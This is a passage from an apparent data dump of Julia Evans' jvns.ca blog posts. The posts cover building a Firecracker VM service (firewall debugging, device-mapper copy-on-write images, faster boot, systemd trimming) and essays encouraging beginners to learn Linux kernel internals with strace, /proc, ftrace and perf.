opt in     out     source               destination         \n   18  1288 ufw-before-logging-input  all  --  *      *       0.0.0.0/0            0.0.0.0/0           \n   18  1288 ufw-before-input  all  --  *      *       0.0.0.0/0            0.0.0.0/0           \n    2   120 ufw-after-input  all  --  *      *       0.0.0.0/0            0.0.0.0/0           \n    2   120 ufw-after-logging-input  all  --  *      *       0.0.0.0/0            0.0.0.0/0           \n    2   120 ufw-reject-input  all  --  *      *       0.0.0.0/0            0.0.0.0/0           \n    2   120 ufw-track-input  all  --  *      *       0.0.0.0/0            0.0.0.0/0         \n \n\n policy DROP 2 packets ! That is suspicious! I double checked that this was\n100% definitely the problem by running  iptables -Z  to reset all of iptables’\ncounts and tried again. Same result! Hooray! \n\n I looked into these  ufw  rules and I found out that  ufw  is a firewall that\noften gets installed in Ubuntu machines. I tried to track down which exact rule\nwas causing the problem, but I didn’t really figure it out. \n\n But I tried completely disabling the firewall with  ufw disable , and it fixed the problem! \n\n solution: disable the ufw firewall \n\n DigitalOcean comes with an external firewall anyway and I didn’t really see why\nI also needed an extra iptables firewall running on my machine, so I decided to just\nrun  ufw disable  to disable that firewall completely. \n\n I added some extra rules to the external firewall to block all TCP ports except\n22 and 80. \n\n some experiments with ignite \n\n On the weekend I spent some time experimenting with reimplementing my\nFirecracker VM API using  ignite . \n\n So far I’ve learned that: \n\n \n ignite turns Docker containers into VM images \n it uses  dmsetup  to set up a device mapper so that it doesn’t need to make a copy of the image every time it starts a VM \n this  doesn’t  mean that 2 images that share some container layers share space on disk though – for every different tag it makes a copy of the whole image \n \n\n I wrote a hacky HTTP API  ignite-manager.go  that just\nshells out to the ignite command line tool a lot. \n\n working on startup speed \n\n Right now the Ignite VMs are taking 15-20 seconds to start on my DigitalOcean\ndroplet.  I think this is kind of too slow (I want to be done in 5 seconds at\nmost!) so I’m going to spend some more time learning about this device mapper\nthing. \n\n"},
{"url": "https://jvns.ca/blog/2021/01/27/day-47--using-device-mapper-to-manage-firecracker-images/", "title": "Day 47: Using device mapper to manage Firecracker images", "content": "\n     \n\n On Tuesday I didn’t get too much done, but I did learn how to use device mapper! \n\n I mostly followed these directions:\n Fun with devicemapper snapshots \nbut with a few changes. I basically tried to do exactly what ignite does  here in snapshot.go , except in a bash script instead of a Go program. \n\n This post isn’t going to be terribly clear because I’m tired right now, these\nare mostly notes for myself so I can remember how to do it later. \n\n the problem: I don’t want to copy images every time I launch a VM \n\n I can’t use the filesystem image directly I launch a VM because if I do, the user will\naccidentally end up changing the base image themself if they write files. \n\n I was dealing with this by making a copy every time, but that’s kind of slow\nand it felt really inefficient. But there’s an alternative! \n\n the solution: copy on write with device mapper! \n\n The solution is to use copy on write! So instead of making a copy, instead we\noverlay another image on top. Reads come through the bottom, but any writes\nonly go to the top level. \n\n The weird thing I had to wrap my head around was that unlike with overlayfs,\nthis copy-on-write thing is implemented at the disk image level – the overlay on\ntop doesn’t contain files, it just contains sort of random blocks of data that\nwould be totally impossible for any program to interpret by themselves. \n\n a commented bash script \n\n Here’s a commented bash script with how I implemented this. It was way simpler\nthan I expected – it’s just runs both  losetup  and  dmsetup  twice. \n\n BASEIMAGE=/path/to/base/image.ext4\nOVERLAY=/path/to/overlay.ext4\n\n# Step 1: Create an empty image\n# I also tried to create the image with fallocate but it didn't work as well\nfor some reason I don't understand yet\nqemu-img create -f raw $OVERLAY 1200M\nOVERLAY_SZ=`blockdev --getsz $OVERLAY`\n\n# Step 2: Create a loop device for the BASEIMAGE file (like /dev/loop16)\nLOOP=$(losetup --find --show --read-only $BASEIMAGE)\nSZ=`blockdev --getsz $BASEIMAGE`\n\n# Step 3: Create /dev/mapper/mybase\nprintf \"0 $SZ linear $LOOP 0\\n$SZ $OVERLAY_SZ zero\"  | dmsetup create mybase\n\n# Step 4: Create another loop device for the OVERLAY file\nLOOP2=$(losetup /dev/loop23 --show $OVERLAY)\n\n# Step 5: Create the final device mapper\necho \"0 $OVERLAY_SZ snapshot /dev/mapper/mybase $LOOP2 P 8\" | dmsetup create myoverlay\n \n\n another problem:  losetup  ends up in an infinite loop sometimes \n\n I noticed that sometimes  losetup , instead of finding and creating a loop\ndevice, sometimes just ends up in an infinite loop where it tries and fails to\ncreate the same loop device forever. I don’t know why that is yet. \n\n"},
{"url": "https://jvns.ca/blog/2021/01/30/day-50--building-some-tarballs-for-puzzles/", "title": "Day 50: Building some tarballs for puzzles, and trying to make a kernel boot faster", "content": "\n     \n\n On Friday I made progress on 3 things: \n\n \n getting my 5.8 kernel to boot faster in Firecracker \n built some puzzle tarballs (which I’ll explain in a bit) \n loaded the puzzle tarballs into my Firecracker VMs \n \n\n the mystery of the slow kernel boot \n\n I noticed that I had 2 pauses when I started my kernel with Firecracker (here’s the  complete log ). \n\n one for 0.3 seconds: \n\n [    0.142205] i8042: If AUX port is really absent please use the 'i8042.noaux' option\n2021-01-29T09:14:10.315589518 [anonymous-instance:WARN:src/devices/src/legacy/i8042.rs:126] Failed to trigger i8042 kbd interrupt (disabled by guest OS)\n[    0.424261] serio: i8042 KBD port at 0x60,0x64 irq 1\n \n\n and one for 0.5 seconds: \n\n [    0.442595] Key type encrypted registered\n[    0.936675] input: AT Raw Set 2 keyboard as /devices/platform/i8042/serio0/input/input0\n \n\n I asked about this in the Firecracker Slack and got a reply suggesting to use\nthe  i8042.noaux  option for the first delay. (which I hadn’t noticed, even\nthough it says it right there :)).  That fixed it! \n\n I still don’t understand why the second delay is happening or how to fix it.\nSomeone suggested it might be related to secure boot, but I spent a while\npoking at my kernel config and tried compiling with 6 different configurations\nand didn’t get anywhere, so I gave up for the day and moved onto something\nelse. \n\n building tarballs of each puzzle \n\n I wrote a little Python script to do this. It basically runs a  build.sh \nscript that I write to build the puzzle inside a Docker container, and then\nmakes a tarball of the Docker container’s current working directory. \n\n Basically I took advantage of the fact that I know how Docker uses overlayfs\ninternally and just took a tarball of the upper part of the overlay directly. \n\n I did this because I couldn’t find a good way to do it using the normal Docker\ninterfaces – I tried some things using a Docker experimental feature called\n docker build --squash  but didn’t really get anywhere. \n\n import os\nimport subprocess\nimport json\nimport time\n\n\npwd = os.getcwd()\n\ncontainer_id = subprocess.check_output([\"docker\", \"run\", \"-v\", f\"{pwd}:/puzzle\", \"-td\",  \"my-base-image\", \"/bin/bash\"])\ncontainer_id = container_id.decode(\"utf-8\").strip()\ncontainer_json = subprocess.check_output([\"docker\", \"inspect\", container_id])\nproperties = json.loads(container_json)\n\nupperdir = properties[0]['GraphDriver']['Data']['UpperDir']\n\nsubprocess.check_call([\"docker\", \"exec\", container_id, \"bash\", \"/puzzle/build.sh\"])\nsubprocess.check_call([\"sudo\", \"tar\", \"-C\", upperdir, \"--exclude=puzzle\", \"--xattrs\", \"-cf\", \"puzzle.tar\", '.'])\n\nsubprocess.check_call([\"docker\", \"kill\", container_id])\n \n\n loading the puzzle tarball when I start a puzzle \n\n I then wrote a little Go function to load in these tarballs when I start a VM.\nIt’s really dumb, it just mounts the image, extracts the tarball into the\nmounted directory, and unmounts. \n\n func (opts *options) copyPuzzleFiles(imagePath string) error {\n\tif opts.Request.Tarball == \"\" {\n\t\treturn nil\n\t}\n\tmountDir := filepath.Join(ImageDir, pseudo_uuid())\n\terr := os.Mkdir(mountDir, 0755)\n\tdefer os.Remove(mountDir)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"Failed creating dir: %s\", mountDir, err)\n\t}\n\n\tif err := exec.Command(\"mount\", imagePath, mountDir).Run(); err != nil {\n\t\treturn fmt.Errorf(\"Failed mounting path %s: %s\", imagePath, err)\n\t}\n\n\tif err := exec.Command(\"tar\", \"-C\", mountDir, \"-xf\", opts.Request.Tarball).Run(); err != nil {\n\t\treturn fmt.Errorf(\"Failed to extract tarball %s: %s\", opts.Request.Tarball, err)\n\t}\n\n\tif err := exec.Command(\"umount\", mountDir).Run(); err != nil {\n\t\treturn fmt.Errorf(\"Failed umounting path %s: %s\", imagePath, err)\n\t}\n\treturn nil\n}\n \n\n One thing I’ve been thinking about with code like this is whether it makes\nsense to shell out to tools or whether it would be better to – for example, Go\nhas a tarball. Right now I don’t really see any benefit to using Go’s tar code\nbecause I feel like these command line tools (mount/umount/tar) are really a\nknown quantity and if I tried to reimplement them in Go I would just write a\nbuggy version that I’d then have to maintain. \n\n filesystems! \n\n I also had a really delightful conversation with my friend Dave about\nfilesystems where we talked about my problems with using device mapper and how\nFirecracker doesn’t support qcow2 and ideas for different ways to get\nFirecracker to support overlay images. \n\n There’s an interesting discussion on the Firecracker GitHub about\n implementing a virtio backend   to let the VM share a directory from the host. \n\n"},
{"url": "https://jvns.ca/blog/2021/01/28/day-48--another-go-program/", "title": "Day 48: Another Go program, and a little vim configuration", "content": "\n     \n\n On Wednesday I was feeling tired so I didn’t do too much. I just translated my\nbash script to set up device mapper from the day before to a Go program. \n\n Today I think I’ll integrate that Go code into my main program! \n\n the go program: set up device mapper \n\n I wrote a little  go code  which does\nbasically the same thing as the bash script from yesterday (sets up some\n /dev/mapper s). \n\n some fun with vim \n\n I never set up my vim, but when writing Go this week I decided to give the\n vim-go  plugin another shot. So far I’m using 3 features from it: \n\n \n it runs  go fmt  to I save \n I can run  <leader>gb  to build my Go program \n If I do  Ctrl+Enter , it goes to the definition of the function \n \n\n The format and builder things are fine (it doesn’t seem that much better to me\nthan just switching to a terminal to do the same thing), but the go to\ndefinition thing is GREAT. I was trying to read some code from Ignite and it\nmade it a lot faster and easier. \n\n Usually I do “go to definition” with a lot of grep so this was a lot faster. \n\n"},
{"url": "https://jvns.ca/blog/2021/02/09/day-56--a-little-webassembly/", "title": "Day 56: A little WebAssembly", "content": "\n      I spent a bunch of time yesterday pairing with Rachel and Jeff on figuring out\nhow to do art in Rust! \n\n I learned that it’s easier to get started with WebAssembly than I thought –\nall we had to do to get this  canvas smiley face example \nrunning was: \n\n git clone https://github.com/rustwasm/wasm-bindgen/\ncd wasm-bindgen/examples/canvas\nnpm install\nnpm run serve\n \n\n At first I was confused because the instructions said to use  npm , but this is a Rust program! What’s going on!\nBut  npm run serve ) is actually running a bunch of cargo commands behind the scenes. \n\n On my slow computer the example took maybe 10 minutes to compile, and it took\nabout 2 minutes on my fast about. \n\n That’s all! Having been reminded that Rust exists, I might work on some  rbspy \nissues today. \n\n"},
{"url": "https://jvns.ca/blog/2021/02/10/day-57--fighting-with-github-actions/", "title": "Day 57: Trying to set up GitHub Actions", "content": "\n     \n\n On Monday I got a very exciting pull request on  rbspy  which implements a feature that I’ve wanted to implement for years – identifying C functions! \n\n Previously if there was a C function in the stack, rbspy would just call it  <c function> - unknown . But it turns out that there’s actually support in Ruby’s  .gdbinit  for finding the name of these C functions, and this  new PR  ports that into rbspy!! \n\n I still haven’t totally understood how the PR works, but I spent a bunch of time with Tim and Mikkel yesterday trying to understand it and it was really fun. I might write about this more later after I’ve understood what it’s doing better. \n\n debugging CI is frustrating \n\n While trying to merge some other rbspy PRs I ran into this chain of events: \n\n \n merge pull request \n realize that the Travis builds are getting slower at building the releases \n think “maybe I’ll implement GitHub actions, how hard can it be?” \n spent a billion years trying to debug various things in GitHub actions \n get very sad \n \n\n This was just exactly the same as every other time I’ve tried to set up CI –\nit’s fine, but it’s always kind of frustrating. \n\n But when I woke up this morning and opened Twitter I saw a tweet from someone who was also having a sad GitHub Actions day, and someone in their replies suggested this  debugging with tmate  action to let you ssh in! So I’m going to try that and maybe that will make everything a lot easier. \n\n"},
{"url": "https://jvns.ca/blog/2021/02/02/day-51--made-a-couple-of-puzzles/", "title": "Day 51: Fixed my logging and made a couple of puzzles", "content": "\n     \n\n Here are a couple of things I did yesterday! \n\n some logging improvements \n\n I was having a problem on my server where I was logging in 3 different ways: \n\n \n Rails was logging to a file called  production.log \n my Go proxy was logging to Docker Compose’s default log thing (whatever that is) \n my Firecracker manager service was logging to journald \n \n\n This was very annoying because I was constantly confused about where to look\nfor logs and it was impossible to see everything in one place. \n\n I set  RAILS_LOG_TO_STDOUT=1  and told Docker Compose to log to journald instead like this: \n\n   rails:\n    environment:\n      - RAILS_LOG_TO_STDOUT=1 \n    logging:\n      driver: \"journald\"\n      options:\n        tag: \"rails\"\n    build: \n        dockerfile: docker/rails/Dockerfile\n        context: .\n \n\n Once I had the logs in journald, it took me a little while to figure out how to\nask journalctl to actually show me the logs for those services and it was\npretty unwieldy, so I added this little function to my  .bashrc  to help me\nout. \n\n function logs {\n    journalctl -b SYSLOG_IDENTIFIER=$1 | less +G\n}\n \n\n some strace puzzles \n\n I wrote a couple of starter puzzles about strace. Here’s the description for\nthe one called “the case of the misconfigured logger” \n\n \n There’s a program in your home directory called run-me. For some reason, it’s been misconfigured so that it’s writing its logs to /dev/null instead of to a file. But you need to know what it’s writing! \n\n Use strace to find out what it’s writing. \n \n\n and one called “the case of the mystery log file” \n\n \n There’s a program in your home directory called run-me. It’s logging its output to a log file, but you can’t find the name of the log file ANYWHERE in its documentation! \n\n Use strace to find out the name of the log file. \n \n\n These aren’t particularly good yet, probably because I spent maybe 5 minutes\nwriting them. Lots of work to do on this front, but I’ll probably do most of it\nafter RC is over. \n\n"},
{"url": "https://jvns.ca/blog/2014/01/04/4-paths-to-being-a-kernel-hacker/", "title": "4 paths to being a kernel hacker", "content": "\n      (this is me continuing work on my  CUSEC  talk\nabout why the kernel isn’t scary) \n\n I once tried asking for advice about how to get started with kernel\nprogramming, and was basically told: \n\n \n If you don’t  need  to understand the kernel for your work, why\nwould you try? \n You should subscribe to the\n Linux kernel mailing list  and just try really\nhard to understand. \n If you’re not writing code that’s meant to be in the main Linux\nkernel, you’re wasting your time. \n \n\n This was really, really, really not helpful to me. So here are a few\npossible strategies for learning about how operating systems and the\nLinux kernel work on your own terms, while having fun. I still only\nknow a few things, but I know more than I did before :)\n \n\n For most of these paths, you’ll need to understand some C, and a bit\nof assembly (at least enough to copy and paste). I’d written a few\nsmall C programs, and took a course in assembly that I’d almost\nentirely forgotten. \n\n Path 1: Write your own OS \n\n This might seem to be a pretty frightening path. But actually it’s\nnot! I started with\n rustboot , which, crucially,\n already worked and did things . Then I could do simple things like\nmaking the screen  blue  instead of red, printing characters to the\nscreen, and move on to trying to get keyboard interrupts to work. \n\n MikeOS  also looks\nlike another fun thing to start with. Remember that your operating\nsystem doesn’t have to be big and professional – if you make it turn\nthe screen purple instead of red and then maybe make it print it a\nlimerick, you’ve already won. \n\n You’ll definitely want to use an emulator like\n qemu  to run your OS in. The\n OSDev wiki  is also a useful\nplace – they have FAQs for a lot of the problems you’ll run into\nalong the way. \n\n Path 2: Write some kernel modules! \n\n If you’re already running Linux, writing a kernel module that doesn’t\ndo anything is pretty easy. \n\n Here’s\n the source for a module \nthat prints “Hello, hacker school!” to the kernel log. It’s 18 lines\nof code. Basically you just register an init and a cleanup function\nand you’re done. I don’t really understand what the  __init  AND\n __exit  macros do, but I can use them! \n\n Writing a kernel module that does do something is harder. I did this\nby deciding on a Thing to do (for example, print a message for every\npacket that comes through the kernel), and then read\nsome  Kernel Newbies , googled a lot, and\ncopied and pasted a lot of code to figure out how to do it. There are\na couple of examples of kernel modules I wrote in this\n kernel-module-fun \nrepository. \n\n Path 3: Do a Linux kernel internship! \n\n The Linux kernel participates in the\n GNOME Outreach Program for Women .\nThis is amazing and fantastic and delightful. What it means is that if\nyou’re a woman and want to spend 3 months working on the kernel, you\ncan get involved in kernel development without any prior experience,\nand get paid a bit ($5000). Here’s\n the Kernel Newbies page explaining how it works . \n\n It’s worth applying if you’re at all interested – you get to format a\npatch for the kernel and it’s fun.\n Sage Sharp , a Linux kernel developer,\ncoordinates this program and she is pretty inspiring. You should read\ntheir\n blog post about how 137 patches got accepted into the kernel during the first round .\nThese patches could be yours! Look at the\n application instructions ! \n\n If you’re not a woman, Google Summer of Code is similar. \n\n Path 4: Read some kernel code \n\n This sounds like terrible advice – “Want to understand how the kernel\nworks? Read the source, silly!” \n\n But it’s actually kind of fun! You won’t understand everything. I felt\nkind of dumb for not understanding things, but then every single\nperson I talked to was like “yeah, it’s the Linux kernel, of course!”. \n\n My friend Dave recently pointed me to  LXR ,\nwhere you can read the kernel source and it provides lots of helpful\ncross-referencing links. For example, if you wanted to understand the\n chmod  system call, you can go look at\n the chmod_common definition \nin the Linux kernel!  livegrep.com \nis also really nice for this. \n\n Here’s the source for  chmod_common , with some comments from me: \n\n static int chmod_common(struct path *path, umode_t mode)\n{\n    struct inode *inode = path->dentry->d_inode;\n    struct iattr newattrs;\n    int error;\n\n    // No idea what this does\n    error = mnt_want_write(path->mnt);\n    if (error)\n        return error;\n\n    // Mutexes! Prevent race conditions! =D\n    mutex_lock(&inode->i_mutex);\n\n    // Check for permission to use chmod, I guess.\n    error = security_path_chmod(path, mode);\n    if (error)\n        goto out_unlock;\n    // I guess this changes the mode!\n    newattrs.ia_mode = (mode & S_IALLUGO) | (inode->i_mode & ~S_IALLUGO);\n    newattrs.ia_valid = ATTR_MODE | ATTR_CTIME;\n    error = notify_change(path->dentry, &newattrs);\nout_unlock:\n    mutex_unlock(&inode->i_mutex); // We're done, so the mutex is over!\n    mnt_drop_write(path->mnt); // ???\n    return error;\n}\n \n\n I find this is a fun time and helps demystify the kernel for me. Most\nof the code I read I find pretty opaque, but some of it (like this\nchmod code) is a little bit understandable. \n\n To summarize a few links: \n\n \n Jessica McKellar ’s blog posts on\nthe  Ksplice blog \n Linux Device Drivers  describes itself\nlike this. I’ve found it somewhat useful.\n> “This book teaches you how to write your own drivers and how to hack around in related parts of the kernel.” \n The  OSDev wiki  is great if you’re\nwriting an OS. \n Kernel Newbies  has some resources for\nstarting kernel developers. I didn’t have good experiences in the\nIRC channel, though. \n Sage Sharp  is a kernel developer and\nruns the Linux kernel outreach and is amazing. \n Valerie Aurora’s posts on LWN.net \n \n\n I’d also love to hear from you. If you’d done kernel work, how did you\nget started with kernel hacking? If you haven’t, which of these paths\nsounds most approachable to you? \n"},
{"url": "https://jvns.ca/blog/2021/01/29/day-49--making-the-vms-boot-faster/", "title": "Day 49: making the VMs boot faster", "content": "\n     \n\n Yesterday I integrated my new device mapper code and spent a bunch of time\ntrying to make my VMs boot faster and I learned a bunch of things. \n\n My plan for making them boot faster was: \n\n \n replace systemd with a lighter weight init system \n that’s it \n \n\n I think I actually discovered that the problem wasn’t systemd and that I can\nkeep systemd! I’ll talk about that in a second, but first I’m going to try to\nwrite down some of my problems with loop devices. \n\n weird bug: sometimes I can’t allocate a loop device \n\n Sometimes, after I create a bunch of /dev/loop devices, I get an error like\n \"/dev/loop26 already mounted or mount point busy.\"  when trying to create and\nuse another one. \n\n I think what’s happening under the hood here is that my program does an ioctl\nto  /dev/loop-control  to get the ID of a free loop device, like this: \n\n stat(\"/dev/loop-control\", {st_mode=S_IFCHR|0660, st_rdev=makedev(0xa, 0xed), ...}) = 0\nopenat(AT_FDCWD, \"/dev/loop-control\", O_RDWR|O_CLOEXEC) = 3</dev/loop-control<char 10:237>>\nioctl(3</dev/loop-control<char 10:237>>, LOOP_CTL_GET_FREE) = 24\nclose(3</dev/loop-control<char 10:237>>) = 0\n \n\n So the kernel here is saying “Ok, /dev/loop24 free”. \n\n But then when I actually try to  use  /dev/loop24, I get an error. \n\n I still don’t understand why this is (am I just misunderstanding something\nabout how the loop device interface works? is it a kernel bug?). I found a\nworkaround, which is if I free all of my loop devices then I can allocate them again. \n\n I think this might be because I’m using different loop devices to refer to the\nsame file, but I’m not sure yet. \n\n adventures in replacing init: can’t allocate a pseudoterminal \n\n Okay, back to my adventures with init systems. I tried replacing systemd in my VMs with  tini ,\na little init system meant for use with containers. \n\n Basically I set  /sbin/init  to this little shell script \n\n #!/bin/bash\n\nmkdir -p /run/sshd\n\ntini -- /usr/sbin/sshd -D\n \n\n I ran into 2 problems with this (which is not very many considering how little it’s doing!!) \n\n problem 1 :  ps aux  didn’t work. \n\n This was because I hadn’t mounted procfs. I added  mount -t proc proc /proc  to\nthe beginning of the script and that fixed it. Easy. \n\n problem 2 : I couldn’t get a prompt from SSH \n\n When I sshed to my VM, I got this error: \n\n PTY allocation request failed on channel 0\n \n\n I had no idea what this meant. I asked on Zulip and Ori linked me to this great\narticle  The TTY Demystified . I\ndidn’t read the whole thing, but it mentioned  /dev/pts  and so I tried to  ls /dev/pts  inside my VM. \n\n And behold – I didn’t have a  /dev/pts ! I Googled how to get one, and found that I could run \n\n mount -t devpts devpts /dev/pts\n \n\n and fix the problem! I didn’t know that Linux had was a  devpts  filesystem for\nmanaging pseudoterminals, that feels like a major missing piece in my “how do\nterminals even work” model. \n\n I added   mount -t devpts devpts /dev/pts  to my little init bash script and that fixed the problem. \n\n adventures in replacing init: make systemd start faster \n\n Once I got this to work I was talking about it to Kamal, and he said something\nto the effect of “well, if you need to do so little to have an init system, maybe you can\njust disable most of systemd and then keep using systemd!” I thought that was a\nfair point (and I do want to be using systemd, to make it feel like a real\ncomputer) \n\n I wrote a hacky Python script called  systemd-surgery.py  and ran it inside my\nVM. I don’t know that this is the best way to do it, but VMs are disposable and\nit seemed to work fine. \n\n Here’s the script with some comments. \n\n import glob\nimport os\nkeep = [\n        'ssh.service', # because we want sshd\n        'systemd-user-sessions.service', # because otherwise systemd complains it's not done booting when you login\n        'systemd-remount-fs.service', # because I think this might be what mounts procfs and devpts\n        'systemd-journald.service', # because otherwise systemd complains that it can't log its progress on boot\n        'sys-kernel-debug.mount', # because we love debugging\n        'sys-kernel-tracing.mount', # because we love tracing\n        'sys-kernel-config.mount', # not sure what this is, might remove it\n#        'dbus.service', # need this for systemd analyze to work, but not otherwise I think\n]\ntargets = ['getty', 'multi-user', 'sockets', 'timers', 'sysinit', 'default']\n\nfor t in targets:\n    for filename in glob.glob(f\"/etc/systemd/system/{t}.target.wants/*\"):\n        if os.path.basename(filename) in keep:\n            continue\n        print(filename)\n        os.remove(filename)\n    for filename in glob.glob(f\"/usr/lib/systemd/system/{t}.target.wants/*\"):\n        if os.path.basename(filename) in keep:\n            continue\n        print(filename)\n        os.remove(filename)\n \n\n I got systemd’s start time to about 0.3s on my fast computer, which felt pretty\ngood. \n\n the real problem: my kernel was starting slowly!!! \n\n Once I got systemd to be fast, I noticed something new I hadn’t noticed before:\nmy kernel was taking 1 second to boot and get into userspace! \n\n I thought this was weird because Firecracker’s whole deal is that you can get\ninto userspace in 150ms. I tested with their example kernel, and that one in\nfact took 144ms to get into userspace! \n\n I don’t know why my kernel is 7x slower, but that’s what I’m going to look into\nnext. Probably I compiled it wrong or something. I didn’t see a lot of clues in\nthe logs but we’ll figure it out! \n\n"},
{"url": "https://jvns.ca/blog/2021/02/04/day-52--out-of-memory-errors/", "title": "Day 52: testing how many Firecracker VMs I can run", "content": "\n     \n\n On Tuesday I finally got around to do something I’d been meaning to do for a\nwhile: test how many Firecracker VMs I can actually run on my little\nDigitalOcean droplet with 1GB of RAM. \n\n This turned out to be less complicated to test than I thought, so let’s get to\nit. \n\n each VM uses 100MB of memory \n\n I hadn’t really thought to look at this number before, but each VM as\nconfigured right now seems to use about 100% of memory. \n\n I’m not sure if I can reduce this yet, but 100MB doesn’t really seem like an\nunreasonable amount of memory for a whole VM because: \n\n \n My kernel is about 30MB and my understanding is that the whole kernel has to\nbe loaded into memory. \n VMs can’t share memory with each other \n \n\n So we’re already at 30MB/VM at a minimum. \n\n I can run about 4 VMs at a time \n\n In my testing so far, I can start about 4 VMs at a time before they start\ngetting OOM killed by the kernel for using too much memory. \n\n I think I could probably get away with a few more but this isn’t great – I\nthink I’d definitely need a bigger machine to use this approach. \n\n why can the Firecracker demo run 4000 VMs? \n\n I still felt a bit confused, because I remembered this  firecracker\ndemo  that said they\ncould run 4000 VMs at a time. Why did that work? \n\n Then I did the arithmetic and it seems pretty straightforward – they were\nrunning the demo on an  i3.metal  which has 512GB of RAM. So those instances\nhave 500x more memory than my little DigitalOcean droplet so it makes sense\nthat they can run about 500x more VMs. \n\n 512GB divided 4000 gives each VM about 125MB of memory, which is what I’m\nusing. \n\n maybe I’ll use fly.io instead for now \n\n Now I’m looking into using fly.io (which runs Firecracker VMs). We’ll see how that goes! \n\n"},
{"url": "https://jvns.ca/blog/2014/09/18/you-can-be-a-kernel-hacker/", "title": "You can be a kernel hacker!", "content": "\n       This blog post is adapted from a talk I gave at Strange Loop\n2014 with the same title.  Watch the video!   \n\n When I started  Hacker School , I wanted to\nlearn how the Linux kernel works. I’d been using Linux for ten years,\nbut I still didn’t understand very well what my kernel did. While\nthere, I found out that: \n\n \n the Linux kernel source code isn’t all totally impossible to\nunderstand \n kernel programming is not just for wizards, it can also be for me! \n systems programming is REALLY INTERESTING \n I could write toy kernel modules, for fun! \n and, most surprisingly of all, all of this stuff was  useful . \n \n\n I hadn’t been doing low level programming at all – I’d written a\nlittle bit of C in university, and otherwise had been doing web\ndevelopment and machine learning. But it turned out that my newfound\noperating systems knowledge helped me solve regular programming tasks\nmore easily. \n\n I also now feel like if I were to be put on  Survivor: fix a bug in my\nkernel’s USB driver , I’d stand a chance of not being immediately\nkicked off the island. \n\n \n\n This is all going to be about Linux, but a lot of the same concepts\napply to OS X. We’ll talk about \n\n \n what even is a kernel? \n why bother learning about this stuff? \n A few strategies for understanding the Linux kernel better, on your own\nterms:\n\n \n strace all the things! \n Read some kernel code! \n Write a fun kernel module! \n Write an operating system! \n Try the Eudyptula challenge \n Do an internship. \n \n \n\n What even is a kernel? \n\n In a few words: \n\n A kernel is a bunch of code that knows how to interact with your hardware . \n\n Linux is mostly written in C, with bit of assembly. Let’s say you go\nto  http://google.com  in your browser. That requires typing, sending\ndata over a network, allocating some memory, and maybe writing some\ncache files. Your kernel has code that \n\n \n interprets your keypresses every time you press a key \n speaks the TCP/IP protocol, for sending information over the network\nto Google \n communicates with your hard drive to write bytes to it \n understands how your filesystem is implemented (what do the bytes on\nthe hard drive even mean?!) \n gives CPU time to all the different processes that might be running \n speaks to your graphics card to display the page \n keeps track of all the memory that’s been allocated \n \n\n and much, much more. All of that code is running all the time you’re\nusing your computer! \n\n This is a lot to handle all at once! The only concept I want to you to\nunderstand for the rest of this post is * system calls . System calls\nare your kernel’s API – regular programs that you write can interact\nwith your computer’s hardware using system calls. A few example system\ncalls: \n\n \n open  opens files \n sendto  and  recvfrom  send and receive network data \n write  writes to disk \n chmod  changes the permissions of a file \n brk  and  sbrk  allocate memory \n \n\n So when you call the  open()  function in Python, somewhere down the\nstack that eventually uses the  open  system call. \n\n That’s all you need to know about the kernel for now! It’s a bunch of\nC code that’s running all the time on your computer, and you interact\nwith it using system calls. \n\n Why learn about the Linux kernel, anyway? \n\n There are some obvious reasons: it’s really fun! Not everyone knows\nabout it! Saying you wrote a kernel module for fun is cool! \n\n But there’s a more serious reason: learning about the interface\nbetween your operating system and your programs will  make you a\nbetter programmer . Let’s see how! \n\n Reason 1: strace \n\n Imagine that you’re writing a Python program, and it’s meant to be\nreading some data from a file  /user/bork/awesome.txt . But it’s not\nworking! \n\n A pretty basic question is: is your program even opening the right\nfile? You could start using your regular debugging techniques to\ninvestigate (print some things out! use a debugger!). But the amazing\nthing is that on Linux, the  only way  to open a file is with the\n open  system call. You can get a list of all of these calls to  open \n(and therefore every file your program has opened) with a tool called\nstrace. \n\n Let’s do a quick example! Let’s imagine I want to know what files\nChrome has opened! \n\n $ strace -e open google-chrome\n[... lots of output omitted ...]\nopen(\"/home/bork/.config/google-chrome/Consent To Send Stats\", O_RDONLY) = 36\nopen(\"/proc/meminfo\", O_RDONLY|O_CLOEXEC) = 36\nopen(\"/etc/opt/chrome/policies/managed/lastpass_policy.json\", O_RDONLY) = 36\n \n\n This is a really powerful tool for observing the  behavior  for a\nprogram that we wouldn’t have if we didn’t understand some basics\nabout system calls. I use strace to: \n\n \n see if the file I  think  my program is opening is what it’s\n really  opening (system call:  read ) \n find out what log file my misbehaving poorly documented program is\nwriting to (though I could also use  lsof ) (system call:  write ) \n spy on what data my program is sending over the network (system\ncalls:  sendto  and  recvfrom ) \n find out every time my program opens a network connection (system\ncall:  socket ) \n \n\n I love strace so much I gave a lightning talk about just strace:\n Spying on your programs with strace . \n\n Reason 2:  /proc \n\n /proc  lets you  recover your deleted files , and is a great\nexample of how understanding your operating system a little better is\nan amazing programming tool. \n\n How does it do that? Let’s imagine that we’ve written a program\n smile.c , and\nwe’re in the middle of running it. But then we accidentally delete the\nbinary! \n\n The PID of that process right now is  8604 . I can find the\nexecutable for that process at  /proc/8604/exe : \n\n  /proc/8604/exe -> /home/bork/work/talks/2014-09-strangeloop/smile (deleted)\n \n\n It’s  (deleted) , but we can still look at it!\n cat /proc/8604/exe > recovered_smile  will recover our executable. Wow. \n\n There’s also a ton of other really useful information about processes\nin  /proc . (like which files they have open – try  ls -l/proc/<pid>/fd ) \n\n You can find out more with  man proc . \n\n Reason 3: ftrace \n\n ftrace is totally different from strace. strace traces  system\ncalls  and ftrace traces  kernel functions . \n\n I honestly haven’t had occasion to do this yet but it is REALLY COOL\nso I am telling you about it. Imagine that you’re having some problems\nwith TCP, and you’re seeing a lot of TCP retransmits. ftrace can give\nyou information about every time the TCP retransmit function in the\nkernel is called! \n\n To see how to actually do this, read Brendan Gregg’s post\n Linux ftrace TCP Retransmit Tracing . \n\n There also appear to be some articles about ftrace on\n Linux Weekly News! \n\n I dream of one day actually investigating this :) \n\n Reason 4: perf \n\n Your CPU has a whole bunch of different levels of caching (L1! L2!)\nthat can have really significant impacts on performance.  perf  is a\ngreat tool that can tell you \n\n \n how often the different caches are being used (how many L1 cache\nmisses are there?) \n how many CPU cycles your program used (!!) \n profiling information (how much time was spent in each function?) \n \n\n and a whole bunch of other insanely useful performance information. \n\n If you want to know more about awesome CPU cycle tracking, I wrote\nabout it in\n I can spy on my CPU cycles with perf! . \n\n Convinced yet? \n\n Understanding your operating system better is  super useful  and will\nmake you a better programmer, even if you write Python. The most\nuseful tools 